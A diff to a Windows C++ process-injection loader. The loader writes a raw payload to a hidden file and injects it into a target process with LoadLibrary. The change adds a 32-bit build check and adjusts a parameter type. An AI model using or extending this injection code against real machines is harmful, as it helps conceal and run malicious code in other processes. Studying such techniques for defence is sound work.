@@ -10,6 +10,7 @@
 #include "target_util.h"
 
 #include "inject_with_loadlibrary.h"
+#include "sysutil.h"
 
 #pragma comment(lib, "Shlwapi.lib")
 
@@ -32,7 +33,7 @@ BYTE* get_raw_payload(OUT SIZE_T &res_size)
     return out_buf;
 }
 
-BOOL write_to_file(BYTE* res_data, DWORD res_size, WCHAR* payloadName)
+BOOL write_to_file(BYTE* res_data, SIZE_T res_size, WCHAR* payloadName)
 {
     HANDLE hFile = CreateFile(payloadName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
     if (hFile == NULL) return FALSE;
@@ -89,13 +90,17 @@ HANDLE get_target()
 
 int main(int argc, char *argv[])
 {
+    if (!is_compiled_32b()) {
+        printf("[ERROR] Not supported! Compile the loader as a 32 bit application!\n");
+        system("pause");
+        return (-1);
+    }
     HANDLE hProcess = get_target();
     if (!hProcess) {
         printf("Could not fetch the target\n");
         system("pause");
         return -1;
     }
-
     //buffer to store the full path:
     WCHAR inject_path[MAX_PATH];
 
